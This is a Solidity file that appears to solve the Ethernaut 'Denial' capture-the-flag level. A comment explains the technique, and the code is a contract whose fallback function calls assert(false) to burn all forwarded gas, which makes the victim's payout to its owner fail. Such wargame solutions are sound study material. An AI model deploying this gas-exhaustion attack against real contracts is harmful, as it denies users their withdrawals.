// # Ethernaut 20: Denial
//
// The key lies in the `assert` keyword: Since we cannot obstruct the withdrawal
// by just rejecting the payout to our attack contract's address, we exhaust the
// entire gas allowance by issuing `assert`, after which the transfer to the owner
// will be rejected due to insufficient gas.

pragma solidity ^0.6.0;

contract DenialAttack {
    fallback () external payable {
        assert(false);
    }
}
